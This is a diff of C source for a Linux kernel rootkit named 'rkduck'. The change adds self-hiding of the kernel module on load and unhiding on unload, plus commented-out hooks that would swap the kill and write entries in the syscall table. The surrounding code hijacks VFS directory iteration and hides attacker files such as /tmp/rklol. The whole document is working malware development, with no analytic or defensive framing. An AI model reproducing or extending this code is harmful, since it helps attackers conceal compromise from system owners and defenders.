@@ -6,6 +6,10 @@ struct hidden_file h_file;
 int duck_init(void) {
     dbg("rkduck: loaded\n");
 
+    if (mod_hidden == 0) {
+        module_hide();
+    }
+
     if ((sys_call_table = (ptr_t *) find_syscall_table())) {
         dbg("rkduck: sys_call_table found at %p\n", sys_call_table);
     } else {
@@ -13,9 +17,10 @@ int duck_init(void) {
         return 0;
     }
 
-    // set_page_rw((ptr_t) sys_call_table);
-    // original_write = xchg(&sys_call_table[__NR_write], duck_write);
-    // set_page_ro((ptr_t) sys_call_table);
+    //set_page_rw((ptr_t) sys_call_table);
+    //original_write = xchg(&sys_call_table[__NR_write], duck_write);
+    //original_kill = xchg(&sys_call_table[__NR_kill], duck_kill);
+    //set_page_ro((ptr_t) sys_call_table);
 
     vfs_hide_file("/root/rkduck/rkduck/rkduck_dir");
     vfs_hide_file(str_remove_duplicates("///tmp////rklol"));
@@ -53,9 +58,14 @@ void duck_exit(void) {
     vfs_hijack_stop(vfs_original_iterate);
     vfs_hijack_stop(vfs_original_proc_iterate);
     
-    // set_page_rw((ptr_t) sys_call_table);
-    // xchg(&sys_call_table[__NR_write], original_write);
-    // set_page_ro((ptr_t) sys_call_table);
+    //set_page_rw((ptr_t) sys_call_table);
+    //xchg(&sys_call_table[__NR_write], original_write);
+    //xchg(&sys_call_table[__NR_kill], original_kill);
+    //set_page_ro((ptr_t) sys_call_table);
+
+    if (mod_hidden == 1) {
+        module_show();
+    }
 
     dbg("rkduck: unloaded\n");
 }
